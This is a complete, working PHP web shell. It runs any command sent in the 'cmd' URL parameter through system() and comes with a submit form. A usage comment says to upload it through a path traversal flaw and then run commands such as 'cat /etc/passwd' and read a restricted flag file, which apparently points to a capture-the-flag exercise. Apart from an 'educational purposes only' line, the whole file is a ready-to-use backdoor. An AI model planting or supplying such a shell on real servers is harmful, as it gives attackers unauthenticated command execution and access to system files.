<?php
// Simple PHP Web Shell
// For educational purposes only

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" style="width: 300px;">
    <input type="submit" value="Execute">
</form>

<!--
USAGE:
1. Upload this file using the path traversal vulnerability
2. Access the file in a browser
3. Enter commands to execute on the server

Example commands:
- whoami
- ls -la
- cat /etc/passwd
- cat ../restricted/flag.txt (to find the flag)
--> 